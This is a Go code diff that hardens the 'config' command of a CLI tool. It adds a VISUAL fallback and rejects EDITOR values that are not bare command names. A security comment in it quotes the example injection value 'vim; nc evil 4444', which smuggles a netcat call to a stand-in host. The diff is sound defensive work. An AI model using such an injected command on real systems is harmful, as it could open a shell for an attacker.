@@ -9,6 +9,7 @@ import (
 	"github.com/spf13/cobra"
 
 	"github.com/saireddy-shyamakura/springx/internal/config"
+	"github.com/saireddy-shyamakura/springx/internal/validate"
 )
 
 var configCmd = &cobra.Command{
@@ -120,11 +121,24 @@ before the editor is opened.`,
 
 		editor := os.Getenv("EDITOR")
 		if editor == "" {
+			editor = os.Getenv("VISUAL")
+		}
+		if editor == "" {
 			if runtime.GOOS == "windows" {
 				editor = "notepad"
 			} else {
 				editor = "nano"
 			}
+		}
+
+		// Security: the editor string is user-controlled (from the
+		// environment) and is passed to the OS. Reject anything that is
+		// not a bare command name — no spaces, no shell metacharacters —
+		// so a value like "vim; nc evil 4444" cannot execute arbitrary
+		// commands. Argument-style editors (e.g. "code --wait") are not
+		// supported for the same reason; set EDITOR to a wrapper script.
+		if !validate.ShellSafe.MatchString(editor) {
+			return fmt.Errorf("refusing to run editor %q: $EDITOR/$VISUAL must be a single command name without spaces or shell metacharacters", editor)
 		}
 
 		c := exec.Command(editor, path)
